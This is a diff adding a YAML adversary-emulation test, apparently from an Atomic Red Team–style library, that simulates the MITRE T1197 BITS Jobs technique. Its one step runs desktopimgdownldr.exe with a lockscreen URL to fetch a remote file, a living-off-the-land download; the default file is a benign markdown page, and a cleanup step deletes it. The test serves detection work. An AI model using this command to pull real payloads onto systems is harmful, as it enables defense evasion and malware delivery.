@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Bits download using desktopimgdownldr.exe (cmd)
+description: "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n"
+args:
+    - name: cleanup_path
+      type: path
+      default: C:\Windows\Temp\Personalization\LockScreenImage
+    - name: cleanup_file
+      type: string
+      default: '*.md'
+    - name: remote_file
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+    - name: download_path
+      type: path
+      default: SYSTEMROOT=C:\Windows\Temp
+uuid: afb5e09e-e385-4dee-9a94-6ee60979d114
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1197: BITS Jobs'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: bits-download-using-desktopimgdownldr.exe-(cmd)
+      inline: |
+        set "{{.Args.download_path}}" && cmd /c desktopimgdownldr.exe /lockscreenurl:{{.Args.remote_file}} /eventName:desktopimgdownldr
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del {{.Args.cleanup_path}}\{{.Args.cleanup_file}} >nul 2>&1
+        executor: command_prompt
